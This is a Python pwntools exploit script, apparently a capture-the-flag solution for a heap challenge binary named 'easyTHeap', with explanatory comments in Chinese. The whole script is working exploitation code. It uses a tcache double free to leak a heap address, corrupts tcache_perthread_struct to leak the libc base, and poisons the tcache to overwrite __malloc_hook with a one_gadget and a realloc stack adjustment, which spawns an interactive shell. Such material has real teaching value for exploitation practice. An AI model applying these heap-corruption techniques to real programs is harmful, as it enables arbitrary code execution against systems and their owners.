#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])

r = process('./easyTHeap')
#libc = ELF('./libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(x):
    r.recvuntil('choice: ')
    r.send(str(x))

def add(l):
    cmd(1)
    r.recvuntil('size?')
    r.sendline(str(int(l)))

def edit(i,s):
    cmd(2)
    r.recvuntil('idx?')
    r.send(str(i))
    r.recvuntil('content:')
    r.send(s)

def show(i):
    cmd(3)
    r.recvuntil('idx?')
    r.sendline(str(i))

def delete(i):
    cmd(4)
    r.recvuntil('idx?')
    r.sendline(str(i))

def exit():
    cmd(5)

add(0x100) # 0

delete(0)
delete(0)

show(0)
leak_heap = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
log.info('leak_heap : {}'.format(hex(leak_heap)))

'''
修改 tcache_perthread_struct 
讓 tcache_count 達到最大

(0x110)   tcache_entry[15](255): 0
'''
add(0x100) # 1
edit(1, p64(leak_heap - 0x250))
add(0x100) # 2
add(0x100) # 3
edit(3, b'\xff'*0x28) # 要蓋到 0x250 的

delete(3)
show(3)
libc_base = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00')) - 0x3ebca0
log.info('libc_base : {}'.format(hex(libc_base)))

malloc_hook = libc_base + libc.symbols[b'__malloc_hook']
realloc = libc_base + libc.symbols[b'__libc_realloc'] # python3 好像有些值都會跑掉
one_gadget = libc_base + 0x4f3c2
log.info('malloc_hook : {}'.format(hex(malloc_hook)))
log.info('realloc : {}'.format(hex(realloc)))

'''
0x250那塊因為進入unsortedbin的關係，
現在再分配的時候會切開它
'''
add(0x100) # 4

'''
直接寫tcache_entry，就可以把
tcache list遷到malloc_hook上
'''
payload = b'\x00'*0xb8 + p64(malloc_hook - 8)
edit(4, payload)

'''
realloc上有很多對稱的push/pop，利用
跳到不同的realloc的位置可以調整stack
'''
add(0x100) # 5
edit(5, p64(one_gadget) + p64(realloc + 8))

#s = 'b *' + str(hex(realloc + 10)) + '\nc\n'
#gdb.attach(r, s)

add(1)


r.interactive()
